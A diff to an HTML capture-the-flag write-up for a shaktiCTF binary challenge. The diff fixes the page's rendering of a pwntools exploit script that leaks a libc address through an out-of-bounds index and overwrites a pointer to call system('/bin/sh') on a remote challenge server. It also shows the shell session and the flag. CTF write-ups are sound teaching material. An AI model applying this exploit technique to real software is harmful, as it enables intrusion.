@@ -76,16 +76,6 @@
               <ul class="nav flex-column">
               </ul>
             </li>
-            
-            <li class="nav-item" data-level="1"><a href="#p-processsim" class="nav-link">p = process("./sim")</a>
-              <ul class="nav flex-column">
-              </ul>
-            </li>
-            
-            <li class="nav-item" data-level="1"><a href="#gdbattachp" class="nav-link">gdb.attach(p)</a>
-              <ul class="nav flex-column">
-              </ul>
-            </li>
         </ul>
     </div>
 </div></div>
@@ -141,36 +131,41 @@ For a change, this is also a 32 bit binary contrary to the 64 bit binaries that 
 <p><em>[In main]</em>
 When the choice is 3, <code>printf(break_);</code> gets executed. So what if <code>break_</code> is <code>/bin/sh</code>? Viola! There pops the shell.</p>
 <p>Note: Alternatively, you can also make use of the format string vulnerability in the <code>printf(break_)</code> to get the required leaks.</p>
-<p>```python=
-from pwn import *</p>
-<h1 id="p-processsim">p = process("./sim")</h1>
-<p>p = remote('13.234.11.113',32651)</p>
-<p>def add(idx,data):
-    p.sendlineafter("MELTDOWN)\n","1")
-    p.sendlineafter("index :\n",str(idx))
-    p.sendlineafter("data :\n",data)</p>
-<p>def show(idx):
-    p.sendlineafter("MELTDOWN)\n","2")</p>
-<pre><code>p.sendlineafter("Enter the index :\n",str(idx))
-</code></pre>
-<p>def leave():
-    p.sendlineafter("MELTDOWN)\n","3")</p>
-<p>p.sendline("/bin/sh\x00")
-show("268435454")</p>
-<p>print("leaks:")
+<pre><code class="language-python">from pwn import *
+#p = process(&quot;./sim&quot;)
+
+p = remote('13.234.11.113',32651)
+
+def add(idx,data):
+    p.sendlineafter(&quot;MELTDOWN)\n&quot;,&quot;1&quot;)
+    p.sendlineafter(&quot;index :\n&quot;,str(idx))
+    p.sendlineafter(&quot;data :\n&quot;,data)
+
+def show(idx):
+    p.sendlineafter(&quot;MELTDOWN)\n&quot;,&quot;2&quot;)
+
+    p.sendlineafter(&quot;Enter the index :\n&quot;,str(idx))
+def leave():
+    p.sendlineafter(&quot;MELTDOWN)\n&quot;,&quot;3&quot;)
+
+p.sendline(&quot;/bin/sh\x00&quot;)
+show(&quot;268435454&quot;)
+
+print(&quot;leaks:&quot;)
 leak = u32(p.recvline()[:4].strip().ljust(4,b'\x00'))
 print(hex(leak))
 base = leak - 0x1d55c0
 system = base + 0x3ce10
-print("System address:", hex(system))
-add("268435449", p32(system))</p>
-<h1 id="gdbattachp">gdb.attach(p)</h1>
-<p>leave()
-p.interactive()</p>
-<pre><code>
-On running the script:
+print(&quot;System address:&quot;, hex(system))
+add(&quot;268435449&quot;, p32(system))
+
+#gdb.attach(p)
+
+leave()
+p.interactive()
 </code></pre>
-<p>[*] Switching to interactive mode
+<p>On running the script:</p>
+<pre><code>[*] Switching to interactive mode
 Choose your ACTION:
 1. add
 2. show
@@ -180,7 +175,7 @@ Dockerfile  flag.txt  ld-2.27.so  libc-2.27.so    libc.so.6  sim    sim.py    yn
 $ cat flag.txt
 shaktiCTF{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng}
 $ exit
-```</p>
+</code></pre>
 <p>:thumbsup::tada:</p>
 <p>Flag: <code>shaktictf{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng}</code>              </p></div>
             </div>
